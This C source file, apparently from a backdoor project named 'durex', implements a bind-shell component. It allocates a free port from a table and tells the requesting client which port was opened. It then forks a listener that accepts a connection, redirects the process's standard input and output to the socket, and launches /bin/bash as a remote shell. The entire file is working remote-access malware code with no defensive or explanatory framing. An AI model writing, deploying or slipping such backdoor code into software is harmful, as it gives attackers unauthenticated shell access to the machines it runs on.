#include "durex.h"

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <pthread.h>

int		bash_prompt(int sck)
{
	close(0);
	close(1);
	close(2);
	if (dup(sck) != 0 || dup(sck) != 1 || dup(sck) != 2)
	{
		return (1);
	}
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
	printf("Remote shell ready:\n");
	execl( "/bin/bash", "/bin/bash", "-c", "bash", NULL );
	return (0);
}

int		shell_socket_server_handler(int sock_server)
{
	int					addr_len;
	struct sockaddr_in	addr;
	int					sock;

	addr_len = sizeof(struct sockaddr_in);
	memset(&addr, 0, addr_len);
	sock = accept(sock_server, (struct sockaddr*)&addr, (socklen_t *)&addr_len);
	return (bash_prompt(sock));
}

int		durex_shell(int port)
{
	int socket = new_socket_server(port);
	if (socket == -1)
		return (1);
	return (shell_socket_server_handler(socket));
}

BOOLEAN	new_durex_shell(t_durex *durex, t_client *client)
{
	int port = -1;
	int id = -1;

	for (int i = 0; i < MAX_SHELLS; i++)
	{
		if (durex->shell_ports_used[i] == false)
		{
			durex->shell_ports_used[i] = true;
			port = durex->shell_ports[i];
			id = i;
			break ;
		}
	}
	if (id == -1 || port == -1)
	{
		dprintf(client->socket, "shell overflow\n");
		return (false);
	}
	dprintf(client->socket, "shell opened on port (%d)\n", port);
	//kick client
	close(client->socket);
	client->used = false;
	free(client->token);
	//fork shell
	int cpid = fork();
	if (cpid == 0)
	{
		durex_shell(port);
		exit(0);
	}
	wait(NULL);
	durex->shell_ports_used[id] = false;
	return (true);
}
